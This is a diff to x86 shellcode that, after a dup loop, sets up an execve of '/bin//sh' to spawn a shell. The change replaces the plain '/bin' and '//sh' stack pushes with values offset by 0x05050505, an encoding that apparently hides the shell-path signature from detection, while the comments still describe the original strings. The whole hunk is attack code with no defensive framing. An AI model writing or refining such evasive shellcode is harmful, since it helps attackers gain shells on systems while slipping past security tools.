@@ -41,8 +41,8 @@ dup_loop:
 ; execve(const char *pathname, char *const argv [], char *const envp[])
     xor eax, eax      ; zero out eax
     push eax          ; push 4-bytes null
-    push 0x68732f2f   ; push "//sh" to the stack
-    push 0x6e69622f   ; push "/bin" to the stack
+    push 0x6d783434   ; push "//sh" (0x68732f2f + 0x05050505)
+    push 0x736e6734   ; push "/bin" (0x6e69622f + 0x05050505)
     mov ebx, esp      ; (#1) address of "/bin//sh"
     push eax          ; push 4-bytes null
     mov edx, esp      ; (#3) envp = [NULL]
